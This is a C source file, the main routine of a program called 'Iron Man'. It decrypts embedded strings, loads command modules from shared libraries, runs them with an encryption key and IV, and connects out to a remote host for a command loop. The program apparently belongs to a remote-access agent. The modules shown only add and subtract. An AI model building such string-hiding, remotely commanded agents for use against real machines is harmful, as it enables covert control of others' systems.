#include "commands/commands.h"
#include "communication/connection.h"
#include "functions/functions.h"
#include "logging/logging.h"

// todo: not here
#include "strings/strings.h"

int main() {
    INITIALIZE_RESULT(res);

    decrypt_strings();

    res = load_all_functions();
    HANDLE_ERROR_RESULT(res)

    res = start_logging();
    HANDLE_ERROR_RESULT(res)

    WRITE_LOG(CRITICAL, "Started Iron Man", NULL)

    res = initialize_commands();
    HANDLE_ERROR_RESULT(res)

    ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
    add_module_command(&res, "/home/user/iron_man/remote_c/cmake-build-debug---remote-host/libmodule_math.so", "sum", 0,
                       5);
    add_module_command(&res, "/home/user/iron_man/remote_c/cmake-build-debug---remote-host/libmodule_math.so",
                       "difference", 0,
                       6);
    remove_module_command(&res, 15);
    remove_module_command(&res, 50);

    INITIALIZE_BUFFER(b);
    res = (result) {SUCCESS, 0};
    b = create_buffer(&res, 8);
    write_unsigned_int(&res, &b, 4);
    write_unsigned_int(&res, &b, 4);
    b.position = 0;
    run_command(&res, 5, COMMUNICATION_IV, COMMUNICATION_KEY, &b);
    b.position = 0;
    run_command(&res, 6, COMMUNICATION_IV, COMMUNICATION_KEY, &b);

    res = (result) {SUCCESS, 0};
    remove_module_command(&res, 6);

    destroy_module_commands();
    ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

    res = connect_();
    HANDLE_ERROR_RESULT(res)

    WRITE_LOG(WARNING, "Connected", NULL)
    res = communicate();
    WRITE_LOG(WARNING, "Disconnected", NULL)

    error_cleanup:

    disconnect();

    destroy_module_commands();

    destroy_commands();

    WRITE_LOG(CRITICAL, "Stopped Iron Man", NULL)

    stop_logging();

    return EXIT_SUCCESS;
}
